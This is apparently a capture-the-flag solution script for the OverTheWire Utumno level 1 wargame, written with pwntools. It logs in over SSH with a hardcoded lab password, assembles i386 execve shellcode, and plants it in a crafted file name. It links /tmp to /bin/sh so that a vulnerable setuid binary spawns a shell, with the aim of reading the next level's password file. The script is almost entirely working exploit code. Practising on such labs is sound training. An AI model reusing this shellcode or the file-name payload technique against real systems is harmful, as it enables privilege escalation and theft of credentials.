from pwn import *


def shellcode_crafting():
    context.arch = 'i386'
    shellcode = shellcraft.mov('eax', 0)
    shellcode += shellcraft.push('eax')
    shellcode += shellcraft.pushstr('pwnp')
    shellcode += shellcraft.mov('ebx', 'esp')
    shellcode += shellcraft.push('eax')
    shellcode += shellcraft.mov('edx', 'esp')
    shellcode += shellcraft.push('ebx')
    shellcode += shellcraft.mov('ecx', 'esp')
    shellcode += shellcraft.mov('al', 0xb)
    shellcode += shellcraft.syscall()
    return shellcode

'''
So, main vulnerability here is that the strncmp checks only the first 3 chars of file name
Just to place shellcode that spawn a shell is impossible, so I placed a shellcode to execve the symlink on the shell
'''
con = ssh('utumno1', 'utumno.labs.overthewire.org', password='aathaeyiew', port=2227)
p = con.process('sh')
p.sendline('cd /tmp/utum1/ && ln -s /bin/sh pwnp')
#shellcode = b'\x31\xc0\x50\x68\x70\x77\x6e\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
shellcode = shellcode_crafting()
print(shellcode)
print(asm(shellcode))
#p.sendline(b'touch sh_$(python -c \'print "\x31\xc0\x50\x68\x70\x77\x6e\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"\')')
p.sendline(b'touch sh_' + asm(shellcode))
p.sendline('/utumno/utumno1 /tmp/utum1')
# For some reasons p.sendline('cat /etc/utumno_pass/utumno2') doesn't work here properly, so here interactive()
p.interactive()
